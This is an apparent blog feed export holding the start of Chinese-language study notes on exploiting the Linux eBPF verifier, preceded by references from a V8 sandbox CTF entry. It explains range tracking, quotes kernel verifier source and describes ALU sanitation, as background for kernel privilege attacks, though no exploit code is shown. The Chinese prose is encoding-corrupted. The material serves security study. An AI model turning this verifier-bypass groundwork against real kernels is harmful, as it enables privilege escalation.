<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ol>
<li><a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html#">Dice CTF Memory Hole: Breaking V8 Heap Sandbox (mem2019.github.io)</a></li>
<li>[<a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/">DiceCTF 2022] - memory hole | kylebotâ€™s Blog</a></li>
<li><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf">V8 Sandbox - High-Level Design Doc - Google æ–‡æ¡£</a></li>
<li><a href="https://tttang.com/archive/1443/#toc_0x01">V8 æ²™ç®±ç»•è¿‡ - è·³è·³ç³– (tttang.com)</a></li>
</ol>
]]></content>
      <categories>
        <category>é¢˜ç›®å¤ç°</category>
      </categories>
      <tags>
        <tag>V8</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>ebpfçš„åˆ©ç”¨</title>
    <url>/2022/12/10/ebpf%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>æœ¬æ–‡è®°å½•è·Ÿéš <a href="https://pawnyable.cafe/linux-kernel/LK06/exploit.html">ptr-yudai PAWNYABLE</a> å­¦ä¹ çš„ ebpf ç›¸å…³å†…å®¹ã€‚</p>
<span id="more"></span>

<h1 id="verifier"><a href="#verifier" class="headerlink" title="verifier"></a>verifier</h1><p>ebpf çš„ verifier å¯¹æŒ‡ä»¤çš„æ£€æŸ¥ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œå…¶ä¸­ç¬¬äºŒä¸ªé˜¶æ®µä¼šé’ˆå¯¹æ‰€æœ‰å¯„å­˜å™¨çš„å€¼è¿½è¸ªå…¶ç±»å‹å’ŒèŒƒå›´ï¼Œå¦‚ä¸‹çš„æƒ…å†µå°†ä¸ä¼šé€šè¿‡æ£€æŸ¥ï¼š</p>
<ul>
<li>ä½¿ç”¨æœªåˆå§‹åŒ–çš„å¯„å­˜å™¨</li>
<li>è¿”å›å†…æ ¸ç©ºé—´çš„æŒ‡é’ˆ</li>
<li>è®²å†…æ ¸ç©ºé—´çš„æŒ‡é’ˆå†™åˆ° BPF æ˜ å°„ä¸Š</li>
<li>éæ³•çš„æŒ‡é’ˆè¯»å†™</li>
</ul>
<p>å…¶ä¸­å¯¹äºå¯„å­˜å™¨å¸¸é‡çš„è·Ÿè¸ªæ˜¯åŸºäºèŒƒå›´çš„è·Ÿè¸ªã€‚å¯¹äºæ¯ä¸ªå¯„å­˜å™¨ï¼Œè®°å½•å…¶åœ¨è¯¥æ—¶é—´èŠ‚ç‚¹ä¸Šå–å€¼çš„æœ€å¤§å€¼å’Œæœ€å°å€¼ã€‚è¿™ä¸€ç‚¹å’Œ v8 å¾ˆåƒã€‚ä¾‹å¦‚ R0 +&#x3D; R1ï¼ŒR0 ä¸ R1 åˆ†åˆ«å– [10, 20]ï¼Œ[-2, 2]ï¼Œé‚£ä¹ˆç»è¿‡è®¡ç®—åçš„ R0 çš„å€¼çš„èŒƒå›´å°±æ˜¯ [8, 22]ã€‚è¿™ç§è¡Œä¸ºåœ¨ <code>adjust_reg_min_max_vals</code> å’Œ <code>adjust_scalar_min_max_vals</code> å‡½æ•°ä¸­å®šä¹‰ã€‚</p>
<blockquote>
<p>åœ¨ä¸çŸ¥é“å…·ä½“æ•°å€¼çš„åˆ†æè¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸åœ¨æŠ½è±¡çš„èŒƒå›´å†…æ¨æ–­å‡ºæ•°å€¼ã€‚å¦‚æœä½ ä¸ä»¥åˆç†çš„æ–¹å¼è¿›è¡ŒæŠ½è±¡ï¼Œè§£é‡Šçš„ç»“æœå¯èƒ½æ˜¯é”™è¯¯çš„ã€‚v8 ä¸­çš„å¾ˆå¤šæ¼æ´ä¹Ÿéƒ½æ˜¯ç”±äºæ¨æ–­ä¼˜åŒ–å‡ºç°é”™è¯¯ï¼Œè¿›è€Œå¯¼è‡´ oob ç­‰ã€‚</p>
</blockquote>
<p>å¯¹äºæ•°å€¼èŒƒå›´çš„è·Ÿè¸ªï¼Œverifier ä¸ºæ¯ä¸ªå¯„å­˜å™¨ä¿ç•™å¹¶è·Ÿè¸ªä»¥ä¸‹çš„æ•°å€¼ï¼š</p>
<table>
<thead>
<tr>
<th align="center">å˜é‡</th>
<th align="center">å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td align="center">umin_value, umax_value</td>
<td align="center">64ä½æ— ç¬¦å·æ•´æ•°çš„æœ€å°å€¼å’Œæœ€å¤§å€¼</td>
</tr>
<tr>
<td align="center">smin_value, smax_value</td>
<td align="center">64ä½æœ‰ç¬¦å·æ•´æ•°çš„æœ€å°å€¼å’Œæœ€å¤§å€¼</td>
</tr>
<tr>
<td align="center">u32_min_value, u32_max_value</td>
<td align="center">32ä½æ— ç¬¦å·æ•´æ•°çš„æœ€å°å€¼å’Œæœ€å¤§å€¼</td>
</tr>
<tr>
<td align="center">s32_min_value, s32_max_value</td>
<td align="center">32ä½æœ‰ç¬¦å·æ•´æ•°çš„æœ€å°å€¼å’Œæœ€å¤§å€¼</td>
</tr>
<tr>
<td align="center">var_off</td>
<td align="center">å¯„å­˜å™¨ä¸­æ¯ä¸ªä½çš„ä¿¡æ¯ï¼ˆå·²çŸ¥å…·ä½“æ•°å€¼çš„ä½ï¼‰</td>
</tr>
</tbody></table>
<p>var_off æ˜¯ä¸€ä¸ªå«åš tnum çš„ç»“æ„ï¼Œå®ƒåŒ…æ‹¬ä¸€ä¸ª mask å’Œä¸€ä¸ª valueã€‚mask æ˜¯å€¼æœªçŸ¥çš„æ¯”ç‰¹çš„ä½ç½®ï¼Œè€Œå€¼æ˜¯å·²çŸ¥æ¯”ç‰¹ä½ç½®çš„å€¼ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> &#123;</span></span><br><span class="line">	u64 value;</span><br><span class="line">	u64 mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ä»ä¸€ä¸ª BPF æ˜ å°„ä¸­å–ä¸€ä¸ª 64 ä½çš„å€¼ï¼Œæœ€åˆæ‰€æœ‰ä½éƒ½æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥ var_off æ˜¯ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(mask=<span class="number">0xffffffffffffffff</span>; value=<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„ä¾‹å­æ˜¯å°† 0xffff0000 ä¸ä¸Šè¿°å¯„å­˜å™¨æŒ‰ä½ä¸ï¼Œä¸ 0 ç›¸ä¸çš„éƒ¨åˆ†ä¸º 0ï¼Œæ‰€ä»¥ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(mask=<span class="number">0xffff0000</span>; value=<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ­¤æ—¶å†ç›¸åŠ  0x12345ï¼Œç”±äºä½åå…­ä½å·²çŸ¥ä¸º 0ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(mask=<span class="number">0x1ffff0000</span>; value=<span class="number">0x2345</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™å°†æ˜¯ä¸€ç§æƒ…å†µã€‚ è¯·æ³¨æ„ï¼Œmask å·²ç»å¢åŠ äº†ä¸€ä¸ªï¼Œä»¥è€ƒè™‘åˆ°è¿›ä½çš„å¯èƒ½æ€§ï¼ˆä¸çŸ¥é“è¿™ä¹ˆç†è§£å¯¹ä¸å¯¹ï¼‰ã€‚ æ­¤æ—¶çš„umin_valueã€umax_valueã€u32_min_value å’Œ u32_max_value åˆ†åˆ«ä¸º 0x1ffff0000ã€0x1ffff2345ã€0xffff0000å’Œ0xffff2345ã€‚</p>
<p>ç°åœ¨çœ‹å…·ä½“å®ç°ï¼Œåœ¨ BPF_ADD çš„æƒ…å†µä¸‹ï¼Œå¯„å­˜å™¨è¢«æ›´æ–°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BPF_ADD:</span><br><span class="line">	scalar32_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">	scalar_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">	dst_reg-&gt;var_off = tnum_add(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨scalar_min_max_addä¸­ï¼Œè€ƒè™‘åˆ°æ•´æ•°æº¢å‡ºç­‰å› ç´ ï¼Œé€šè¿‡èŒƒå›´è®¡ç®—å®ç°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">scalar_min_max_add</span><span class="params">(<span class="keyword">struct</span> bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> bpf_reg_state *src_reg)</span></span><br><span class="line">&#123;</span><br><span class="line">	s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">	s64 smax_val = src_reg-&gt;smax_value;</span><br><span class="line">	u64 umin_val = src_reg-&gt;umin_value;</span><br><span class="line">	u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (signed_add_overflows(dst_reg-&gt;smin_value, smin_val) ||</span><br><span class="line">	    signed_add_overflows(dst_reg-&gt;smax_value, smax_val)) &#123;</span><br><span class="line">		dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">		dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		dst_reg-&gt;smin_value += smin_val;</span><br><span class="line">		dst_reg-&gt;smax_value += smax_val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dst_reg-&gt;umin_value + umin_val &lt; umin_val ||</span><br><span class="line">	    dst_reg-&gt;umax_value + umax_val &lt; umax_val) &#123;</span><br><span class="line">		dst_reg-&gt;umin_value = <span class="number">0</span>;</span><br><span class="line">		dst_reg-&gt;umax_value = U64_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		dst_reg-&gt;umin_value += umin_val;</span><br><span class="line">		dst_reg-&gt;umax_value += umax_val;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<details class="note "><summary><p>è¿™æ˜¯ <code>struct bpf_reg_state </code>çš„ç»“æ„</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Ordering of fields matters.  See states_equal() */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">	<span class="comment">/* Fixed part of pointer offset, pointer types only */</span></span><br><span class="line">	s32 off;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* valid when type == PTR_TO_PACKET */</span></span><br><span class="line">		<span class="type">int</span> range;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">		 *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">			<span class="comment">/* To distinguish map lookups from outer map</span></span><br><span class="line"><span class="comment">			 * the map_uid is non-zero for registers</span></span><br><span class="line"><span class="comment">			 * pointing to inner maps.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			u32 map_uid;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* for PTR_TO_BTF_ID */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line">			u32 btf_id;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		u32 mem_size; <span class="comment">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Max size from any of the above. */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> raw1;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> raw2;</span><br><span class="line">		&#125; raw;</span><br><span class="line"></span><br><span class="line">		u32 subprogno; <span class="comment">/* for PTR_TO_FUNC */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">/* For PTR_TO_PACKET, used to find other pointers with the same variable</span></span><br><span class="line"><span class="comment">	 * offset, so they can share range knowledge.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_MAP_VALUE_OR_NULL this is used to share which map value we</span></span><br><span class="line"><span class="comment">	 * came from, when one is tested for != NULL.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_MEM_OR_NULL this is used to identify memory allocation</span></span><br><span class="line"><span class="comment">	 * for the purpose of tracking that it&#x27;s freed.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_SOCKET this is used to share which pointers retain the</span></span><br><span class="line"><span class="comment">	 * same reference to the socket, to determine proper reference freeing.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 id;</span><br><span class="line">	<span class="comment">/* PTR_TO_SOCKET and PTR_TO_TCP_SOCK could be a ptr returned</span></span><br><span class="line"><span class="comment">	 * from a pointer-cast helper, bpf_sk_fullsock() and</span></span><br><span class="line"><span class="comment">	 * bpf_tcp_sock().</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Consider the following where &quot;sk&quot; is a reference counted</span></span><br><span class="line"><span class="comment">	 * pointer returned from &quot;sk = bpf_sk_lookup_tcp();&quot;:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 1: sk = bpf_sk_lookup_tcp();</span></span><br><span class="line"><span class="comment">	 * 2: if (!sk) &#123; return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 3: fullsock = bpf_sk_fullsock(sk);</span></span><br><span class="line"><span class="comment">	 * 4: if (!fullsock) &#123; bpf_sk_release(sk); return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 5: tp = bpf_tcp_sock(fullsock);</span></span><br><span class="line"><span class="comment">	 * 6: if (!tp) &#123; bpf_sk_release(sk); return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 7: bpf_sk_release(sk);</span></span><br><span class="line"><span class="comment">	 * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier will complain</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After bpf_sk_release(sk) at line 7, both &quot;fullsock&quot; ptr and</span></span><br><span class="line"><span class="comment">	 * &quot;tp&quot; ptr should be invalidated also.  In order to do that,</span></span><br><span class="line"><span class="comment">	 * the reg holding &quot;fullsock&quot; and &quot;sk&quot; need to remember</span></span><br><span class="line"><span class="comment">	 * the original refcounted ptr id (i.e. sk_reg-&gt;id) in ref_obj_id</span></span><br><span class="line"><span class="comment">	 * such that the verifier can reset all regs which have</span></span><br><span class="line"><span class="comment">	 * ref_obj_id matching the sk_reg-&gt;id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * sk_reg-&gt;ref_obj_id is set to sk_reg-&gt;id at line 1.</span></span><br><span class="line"><span class="comment">	 * sk_reg-&gt;id will stay as NULL-marking purpose only.</span></span><br><span class="line"><span class="comment">	 * After NULL-marking is done, sk_reg-&gt;id can be reset to 0.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After &quot;fullsock = bpf_sk_fullsock(sk);&quot; at line 3,</span></span><br><span class="line"><span class="comment">	 * fullsock_reg-&gt;ref_obj_id is set to sk_reg-&gt;ref_obj_id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After &quot;tp = bpf_tcp_sock(fullsock);&quot; at line 5,</span></span><br><span class="line"><span class="comment">	 * tp_reg-&gt;ref_obj_id is set to fullsock_reg-&gt;ref_obj_id</span></span><br><span class="line"><span class="comment">	 * which is the same as sk_reg-&gt;ref_obj_id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * From the verifier perspective, if sk, fullsock and tp</span></span><br><span class="line"><span class="comment">	 * are not NULL, they are the same ptr with different</span></span><br><span class="line"><span class="comment">	 * reg-&gt;type.  In particular, bpf_sk_release(tp) is also</span></span><br><span class="line"><span class="comment">	 * allowed and has the same effect as bpf_sk_release(sk).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 ref_obj_id;</span><br><span class="line">	<span class="comment">/* For scalar types (SCALAR_VALUE), this represents our knowledge of</span></span><br><span class="line"><span class="comment">	 * the actual value.</span></span><br><span class="line"><span class="comment">	 * For pointer types, this represents the variable part of the offset</span></span><br><span class="line"><span class="comment">	 * from the pointed-to object, and is shared with all bpf_reg_states</span></span><br><span class="line"><span class="comment">	 * with the same id as us.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span></span><br><span class="line">	<span class="comment">/* Used to determine if any memory access using this register will</span></span><br><span class="line"><span class="comment">	 * result in a bad access.</span></span><br><span class="line"><span class="comment">	 * These refer to the same value as var_off, not necessarily the actual</span></span><br><span class="line"><span class="comment">	 * contents of the register.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s64 smin_value; <span class="comment">/* minimum possible (s64)value */</span></span><br><span class="line">	s64 smax_value; <span class="comment">/* maximum possible (s64)value */</span></span><br><span class="line">	u64 umin_value; <span class="comment">/* minimum possible (u64)value */</span></span><br><span class="line">	u64 umax_value; <span class="comment">/* maximum possible (u64)value */</span></span><br><span class="line">	s32 s32_min_value; <span class="comment">/* minimum possible (s32)value */</span></span><br><span class="line">	s32 s32_max_value; <span class="comment">/* maximum possible (s32)value */</span></span><br><span class="line">	u32 u32_min_value; <span class="comment">/* minimum possible (u32)value */</span></span><br><span class="line">	u32 u32_max_value; <span class="comment">/* maximum possible (u32)value */</span></span><br><span class="line">	<span class="comment">/* parentage chain for liveness checking */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">	<span class="comment">/* Inside the callee two registers can be both PTR_TO_STACK like</span></span><br><span class="line"><span class="comment">	 * R1=fp-8 and R2=fp-8, but one of them points to this function stack</span></span><br><span class="line"><span class="comment">	 * while another to the caller&#x27;s stack. To differentiate them &#x27;frameno&#x27;</span></span><br><span class="line"><span class="comment">	 * is used which is an index in bpf_verifier_state-&gt;frame[] array</span></span><br><span class="line"><span class="comment">	 * pointing to bpf_func_state.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 frameno;</span><br><span class="line">	<span class="comment">/* Tracks subreg definition. The stored value is the insn_idx of the</span></span><br><span class="line"><span class="comment">	 * writing insn. This is safe because subreg_def is used before any insn</span></span><br><span class="line"><span class="comment">	 * patching which only happens after main verification finished.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s32 subreg_def;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_liveness</span> <span class="title">live</span>;</span></span><br><span class="line">	<span class="comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span></span><br><span class="line">	<span class="type">bool</span> precise;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</details>

<p>è¿™æ ·çš„æ›´æ–°è¿‡ç¨‹æ˜¯é’ˆå¯¹æ‰€æœ‰æ“ä½œå®ç°çš„ã€‚32&#x2F;64 ä½çš„åŠ å‡ä¹˜é™¤ã€ç§»ä½ç­‰ã€‚è®¡ç®—å€¼çš„èŒƒå›´ç”¨äºæ£€æŸ¥åç§»é‡æ˜¯å¦è½åœ¨äº†å †æ ˆå’Œä¸Šä¸‹æ–‡ç­‰å†…å­˜è®¿é—®çš„èŒƒå›´å†…ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå †æ ˆçš„èŒƒå›´æ£€æŸ¥åœ¨ <a href="https://elixir.bootlin.com/linux/v5.18.11/source/kernel/bpf/verifier.c#L4315">check_stack_access_within_bounds</a> ä¸­å®šä¹‰ï¼Œå¦‚æœå·²çŸ¥è¯¥å€¼æ’å®šï¼Œä¹Ÿå°±æ˜¯ç«‹å³æ•°çš„æƒ…å†µä¸‹ï¼Œå°±è¿›è¡Œæ­£å¸¸çš„åç§»é‡æ£€æŸ¥ã€‚å¦‚æœä¸çŸ¥é“å…·ä½“æ•°å€¼ï¼Œå°±æ£€æŸ¥åç§»é‡å¯èƒ½ç”¨çš„æœ€å¤§å€¼å’Œæœ€å°å€¼ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Returns true if @a is a known constant */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">tnum_is_const</span><span class="params">(<span class="keyword">struct</span> tnum a)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> !a.mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check that the stack access at &#x27;regno + off&#x27; falls within the maximum stack</span></span><br><span class="line"><span class="comment"> * bounds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &#x27;off&#x27; includes `regno-&gt;offset`, but not its dynamic part (if any).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">check_stack_access_within_bounds</span><span class="params">(Â·Â·Â·)</span> &#123;</span><br><span class="line">    Â·Â·Â·</span><br><span class="line">    <span class="keyword">if</span> (tnum_is_const(reg-&gt;var_off)) &#123;</span><br><span class="line">        min_off = reg-&gt;var_off.value + off;</span><br><span class="line">        <span class="keyword">if</span> (access_size &gt; <span class="number">0</span>)</span><br><span class="line">            max_off = min_off + access_size - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            max_off = min_off;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (reg-&gt;smax_value &gt;= BPF_MAX_VAR_OFF ||</span><br><span class="line">            reg-&gt;smin_value &lt;= -BPF_MAX_VAR_OFF) &#123;</span><br><span class="line">            verbose(env, <span class="string">&quot;invalid unbounded variable-offset%s stack R%d\n&quot;</span>,</span><br><span class="line">                    err_extra, regno);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">        min_off = reg-&gt;smin_value + off;</span><br><span class="line">        <span class="keyword">if</span> (access_size &gt; <span class="number">0</span>)</span><br><span class="line">            max_off = reg-&gt;smax_value + off + access_size - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            max_off = min_off;</span><br><span class="line">    &#125;</span><br><span class="line">    Â·Â·Â·</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¾—åˆ°çš„å€¼å°±ä¼šè¢«ç”¨ä½œèŒƒå›´æ£€æŸ¥ï¼Œå…ˆæ£€æŸ¥æœ€å°å€¼æ˜¯å¦è¶Šç•Œï¼Œå†æ£€æŸ¥æœ€å¤§å€¼ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">err = check_stack_slot_within_bounds(min_off, state, type);</span><br><span class="line"><span class="keyword">if</span> (!err)</span><br><span class="line">    err = check_stack_slot_within_bounds(max_off, state, type);</span><br></pre></td></tr></table></figure>

<p>è¿™ç§è·Ÿè¸ªå¯„å­˜å™¨å’Œå˜é‡çš„å–å€¼èŒƒå›´çš„æ–¹å¼ä¹Ÿç»å¸¸è¢«ç”¨äº BPF ä¹‹å¤–çš„ JIT ä¸­ï¼Œå› ä¸º JIT åªéœ€è¦ä¼˜åŒ–å’Œé€Ÿåº¦ã€‚</p>
<h2 id="ALU-Arithmetic-Logic-Unit-sanitation"><a href="#ALU-Arithmetic-Logic-Unit-sanitation" class="headerlink" title="ALU(Arithmetic Logic Unit) sanitation"></a>ALU(Arithmetic Logic Unit) sanitation</h2><p>åˆ°ç›®å‰ä¸ºæ­¢æè¿°çš„ç±»å‹æ£€æŸ¥å’ŒèŒƒå›´è¿½è¸ªæ˜¯éªŒè¯å™¨çš„å·¥ä½œï¼Œä½†ç”±äºåˆ©ç”¨eBPFçš„æ”»å‡»è¶Šæ¥è¶Šå¤šï¼Œè¿‘å¹´æ¥å¼•å…¥äº†ä¸€ç§æ–°çš„ç¼“è§£æœºåˆ¶ï¼Œç§°ä¸º ALU sanitationã€‚</p>
<p>æ”»å‡»å‘ç”Ÿåœ¨ verifier çŒœæµ‹é”™è¯¯ï¼Œè€Œå¼•èµ·äº† oobã€‚ä¾‹å¦‚ä¸€ä¸ªå€¼å®é™…ä¸º 32ï¼Œä½†æ˜¯ verifier çŒœæµ‹ä¸º 0ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘ oobã€‚</p>
<p><img src="/img/ebpf-12-10/simple_oob.png"></p>
<p>ä¸ºäº†è§£å†³è¿™äº›ç”±äºéªŒè¯å™¨é”™è¯¯å¯¼è‡´çš„è¶…èŒƒå›´å¼•ç”¨ï¼Œ2019å¹´å¼•å…¥äº†ä¸€ç§åä¸º ALU sanitation çš„ç¼“è§£æœºåˆ¶ã€‚</p>
<p>åœ¨ ebpf ä¸­ï¼Œåªæœ‰æ ‡é‡å€¼çš„åŠ å‡æ³•è¢«å…è®¸ä½œä¸ºæŒ‡é’ˆçš„ä¸€ç§æ“ä½œã€‚åœ¨ ALU sanitation ä¸­ï¼Œå½“æ ‡é‡å€¼å·²çŸ¥æ˜¯æŒ‡é’ˆå’Œæ ‡é‡å€¼ç›¸åŠ çš„å¸¸æ•°æ—¶ï¼Œä¼šè¢«æ”¹å†™ä¸ºå¸¸æ•°æ“ä½œ <code>BPF_ALUxx_IMM</code>ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ R1 æ˜¯ä¸€ä¸ªæŒ‡å‘æ˜ å°„çš„æŒ‡é’ˆï¼›R2 æ˜¯ä¸€ä¸ªæ ‡é‡å€¼çš„å¯„å­˜å™¨ï¼ŒçŒœæµ‹å€¼ä¸º 0ï¼Œå®é™…ä¸º 1ã€‚è¿™ç§æƒ…å†µä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2)</span><br></pre></td></tr></table></figure>

<p>å› ä¸º verifier è®¤ä¸º R2 æ˜¯ä¸€ä¸ªå¸¸æ•° 0ï¼Œæ‰€ä»¥è¢«æ”¹ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>è¯¥è¡¥ä¸æœ€åˆæ˜¯ä¸ºäº†é˜²æ­¢åä¸º Spectre çš„ä¾§ä¿¡é“æ”»å‡»ï¼Œä½†å®ƒå¯¹åˆ©ç”¨ verifier æ¼æ´çš„æ”»å‡»ä¹Ÿå¾ˆæœ‰æ•ˆã€‚</p>
<p>æ­¤å¤–ï¼Œå¦‚æœæ ‡é‡æ–¹ä¸æ˜¯å¸¸æ•°ï¼ŒæŒ‡ä»¤ä¼šä½¿ç”¨ <code>alu_limit</code> å€¼è¿›è¡Œä¿®è¡¥ã€‚<strong>alu_limit æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºè¯¥æŒ‡é’ˆæœ€å¤šå¯ä»¥å¢åŠ æˆ–å‡å°‘å¤šå°‘ä¸ªå€¼ã€‚</strong> ä¾‹å¦‚ï¼Œå¦‚æœæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå¤§å°ä¸º 0x10 çš„æ˜ å°„å…ƒç´ å¼€å§‹çš„ç¬¬äºŒä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”ç”±äº BPF_ADD å‘ç”Ÿäº†ä¸æ ‡é‡å€¼çš„ç›¸åŠ ï¼Œ<code>alu_limit</code> å³ä¸º 0xeã€‚</p>
<p>å’Œå‰é¢ä¸€æ ·ï¼Œè€ƒè™‘å°†æ ‡é‡å€¼R2åŠ åˆ°å¯„å­˜å™¨R1ä¸­ï¼ŒR1æŒ‡å‘å¤§å°ä¸º0x10çš„åœ°å›¾å…ƒç´ å¼€å§‹çš„ç¬¬äºŒä¸ªå­—èŠ‚ï¼š</p>
